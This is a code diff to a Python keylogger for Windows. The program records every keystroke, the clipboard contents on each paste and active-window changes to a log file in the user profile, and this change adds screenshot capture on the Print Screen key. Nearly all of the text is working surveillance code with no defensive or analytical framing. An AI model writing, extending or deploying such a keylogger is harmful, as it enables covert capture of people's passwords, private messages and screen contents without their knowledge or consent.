@@ -4,6 +4,7 @@ from datetime import datetime
 from pynput import keyboard as kb
 from pynput.keyboard import Key
 import keyboard
+import pyautogui
 import pyperclip
 import win32gui
 
@@ -14,7 +15,7 @@ special_keys = {
     Key.alt_r: "",
     Key.backspace: " [Backspace] ",
     Key.caps_lock: "",
-    Key.cmd_l: " [Win] ",
+    Key.cmd_l: " [Windows Key] ",
     Key.ctrl_l: "",
     Key.ctrl_r: "",
     Key.delete: " [Delete] ",
@@ -80,16 +81,29 @@ def on_press(key):
             if key in special_keys:
                 file.write(special_keys[key])
             elif key is None:
-                file.write("\n" + ("=" * 50) + "\n" + "[Error]: Key press event was None" + "\n" + ("=" * 50) + "\n")
+                file.write("\n" + "[Error]: Key press event was None" + "\n")
             else:
                 char = key.char
                 try:
                     unicodedata.name(char)
-                    file.write(char)
+                    file.write(unicodedata.normalize('NFC', char))
                 except (ValueError, AttributeError):
-                    file.write("\n" + ("=" * 50) + "\n" + "[Unknown Key]: " f"\"{str(key)}\"" + "\n" + ("=" * 50) + "\n")
+                    file.write("\n" + "[Unknown Key]: " f"\"{str(key)}\"" + "\n")
         except AttributeError:
             file.write(str(key))
+
+def screenshots():
+    log_window_change()
+    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
+    with open(path, "a", encoding="utf-8") as file:
+        folder_path = os.path.join(os.getenv("USERPROFILE"), "screenshots")
+        if not os.path.exists(folder_path):
+            os.makedirs(folder_path)
+        timestamp = datetime.now().strftime("%m%d%Y_%H%M%S_%f")
+        file_path = os.path.join(folder_path, f"screenshot_{timestamp}.png")
+        screenshot = pyautogui.screenshot()
+        screenshot.save(file_path)
+        file.write("\n" + "[PrtScn]: " + file_path + "\n")
 
 def copy_clipboard_data():
     log_window_change()
@@ -99,15 +113,16 @@ def copy_clipboard_data():
         if clipboard_data:
             file.write("\n[Clipboard data]: {\n" + clipboard_data + " \n}\n")
         else:
-            file.write("\n" + ("=" * 50) + "[Warning]: Clipboard data is empty" + ("=" * 50) + "\n")
+            file.write("\n" + "[Warning]: Clipboard data is empty" + "\n")
 
 def write_date_to_file():
     path = os.path.join(os.getenv("USERPROFILE"), "result.log")
     with open(path, "a", encoding="utf-8") as file:
         current_date = datetime.now().strftime("%m/%d/%Y %H:%M")
-        file.write("\n" + ("=" * 50) + "\n[Date]: " + current_date + "\n" + ("=" * 50) + "\n")
+        file.write("\n" + ("#" * 50) + "\n[Date]: " + current_date + "\n" + ("#" * 50) + "\n")
 
 write_date_to_file()
+keyboard.add_hotkey("print screen", screenshots, suppress=False)
 keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
 
 with kb.Listener(on_press=on_press) as listener:
